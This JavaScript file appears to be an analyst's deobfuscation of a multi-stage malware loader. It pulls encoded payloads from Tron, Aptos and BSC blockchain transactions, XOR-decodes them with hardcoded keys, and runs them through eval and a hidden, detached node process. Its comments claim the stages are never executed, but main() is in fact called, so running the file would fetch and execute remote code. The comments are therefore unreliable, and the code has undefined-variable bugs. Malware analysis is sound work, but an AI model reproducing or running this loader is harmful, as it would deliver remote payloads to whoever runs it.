// Static deobfuscation of payload2.js.
// This preserves structure for analysis, but intentionally does not execute stages.

const https = require("https");
const { spawn } = require("child_process");

global._V = "A" + global["!"];

async function fetchJson(url) {
  return new Promise((resolve, reject) => {
    https
      .get(url, (res) => {
        let body = "";
        res.on("data", (chunk) => {
          body += chunk;
        });
        res.on("end", () => {
          try {
            resolve(JSON.parse(body));
          } catch (err) {
            reject(err);
          }
        });
        res.setTimeout(10000, () => {
          req.destroy(new Error(`Request timed out after ${timeoutMs}ms`));
        });
      })
      .on("error", (err) => {
        reject(err);
      })
      .end();
  });
}

async function rpcCall(method, params = [], hostname) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify({
      jsonrpc: "2.0",
      method,
      params,
      id: 1,
    });

    const req = https
      .request({ hostname, method: "POST" }, (res) => {
        let response = "";
        res.on("data", (chunk) => {
          response += chunk;
        });
        res.on("end", () => {
          try {
            resolve(JSON.parse(response));
          } catch (err) {
            reject(err);
          }
        });
      })
      .on("error", reject);

    req.write(body);
    req.end();
  });
}

function xorDecode(key, encoded) {
  const keyLength = key.length;
  let output = "";

  for (let index = 0; index < encoded.length; index++) {
    const keyChar = key.charCodeAt(index % keyLength);
    output += String.fromCharCode(encoded.charCodeAt(index) ^ keyChar);
  }

  return output;
}

async function recoverStage(xorKey, tronAddress, aptosAddress) {
  let transactionHashLikeValue;

  try {
    const tron = await fetchJson(
      "https://api.trongrid.io/v1/accounts/" +
        tronAddress +
        "/transactions?only_confirmed=true&only_from=true&limit=1",
    );

    transactionHashLikeValue = Buffer.from(tron.data[0].raw_data.data, "hex")
      .toString("utf8")
      .split("?.?")
      .reverse()
      .join("");

    if (!transactionHashLikeValue) {
      throw new Error("Empty Tron-derived value");
    }
  } catch {
    const aptos = await fetchJson(
      "https://fullnode.mainnet.aptoslabs.com/v1/accounts/" +
        aptosAddress +
        "/transactions?limit=1",
    );

    transactionHashLikeValue = aptos[0].payload.arguments[0];
  }

  async function fetchBscStage(host) {
    const rpc = await rpcCall(
      "eth_getTransactionByHash",
      [transactionHashLikeValue],
      host,
    );
    console.log(JSON.stringify(rpc));
    return Buffer.from(rpc.result.input.substring(2), "hex")
      .toString("utf8")
      .split("?.?")[1];
  }

  let encodedStage;
  try {
    encodedStage = await fetchBscStage("bsc-dataseed.binance.org");
    if (!encodedStage) {
      throw new Error("Primary BSC RPC returned no stage");
    }
  } catch {
    encodedStage = await fetchBscStage("bsc-rpc.publicnode.com");
  }

  return xorDecode(xorKey, encodedStage);
}

async function main() {
  const now = new Date().getTime();

  try {
    if (global._p_t && now - global._p_t < 30000) {
      return;
    }
  } catch {}

  global._p_t = now;

  try {
    const stage1 = await recoverStage(
      "2[gWfGj;<:-93Z^C",
      "TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP",
      "0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e",
    );

    // Original behavior:
    console.log("[redacted] stage1 recovered:", stage1.length);
    eval(stage1);
  } catch (err) {
    console.error("stage1 failed to query:", err);
  }

  try {
    const stage2 = await recoverStage(
      "m6:tTh^D)cBz?NM]",
      "TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG",
      "0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3",
    );

    // Original behavior:
    spawn("node", ["-e", "global['_V']='" + (global._V || 0) + "';" + stage2], {
      detached: true,
      stdio: "ignore",
      windowsHide: true,
    }).on("error", () => {
      eval(stage2);
    });

    console.log("[redacted] stage2 recovered:", stage2.length);
    console.log("[redacted] stage2 :", stage2);
  } catch (err) {
    console.log("stage2 failed to query", err);
  }
}

main();
setTimeout(() => {}, 30000);

// Intentionally not invoked.
